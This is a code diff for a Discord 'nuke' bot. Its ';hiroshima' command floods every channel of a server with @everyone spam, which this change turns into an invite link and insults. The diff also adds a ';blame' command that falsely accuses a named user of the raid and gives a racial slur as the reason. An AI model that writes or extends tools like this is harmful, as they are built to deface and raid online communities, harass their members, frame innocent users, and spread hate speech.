@@ -38,8 +38,9 @@ async def on_ready():
     print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
     print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
     print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
+    print(f"{Fore.MAGENTA}[3] ;blame @user - Accuses someone | [4] ;credits - Shows My Socials")
     print(f"{Fore.MAGENTA}------------------------------------------------------------------")
-    print(f"{Fore.MAGENTA}[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left")
+    print(f"{Fore.MAGENTA}[5] ;nothing - nothing left")
 
 REPORT_CHANNEL_ID = 1516330515110559765
 
@@ -101,15 +102,39 @@ async def hiroshima(ctx):
         messages = []
         for channel in channels:
             for _ in range(5):
-                messages.append(channel.send("@everyone Server Just Got Fucked By blossom."))
+                messages.append(channel.send("@everyone discord.gg/Gx9b3AsJR3 owns ur server pussy"))
         await asyncio.gather(*messages, return_exceptions=True)
+
+@client.command()
+async def blame(ctx, member: discord.Member = None):
+    """Accuse a user of nuking the server."""
+    target = member or ctx.author
+    blame_reasons = [
+        "thanks for nuking nigga!",
+        "thanks for nuking nigga!",
+        "thanks for nuking nigga!",
+        "thanks for nuking nigga!",
+        "thanks for nuking nigga!"
+    ]
+    reason = random.choice(blame_reasons)
+
+    embed = discord.Embed(
+        title="Blame report",
+        description=f"{target.mention} has been blamed for nuking the server.",
+        color=discord.Color.orange()
+    )
+    embed.add_field(name="Accused by", value=ctx.author.mention, inline=True)
+    embed.add_field(name="Reason", value=reason, inline=False)
+    embed.set_footer(text="The evidence is mostly vibes.")
+    await ctx.send(embed=embed)
 
 @client.command()
 async def help(ctx):
     messages = [
         ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**"),
+        ctx.send("**[3] ;blame @user - Accuses someone for nuking the server**"),
         ctx.send("**-------------------------------------------------------------------------**"),
-        ctx.send("**[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left**")
+        ctx.send("**[4] ;credits - Shows My Socials  |     [5] ;nothing - nothing left**")
     ]
     await asyncio.gather(*messages)
 
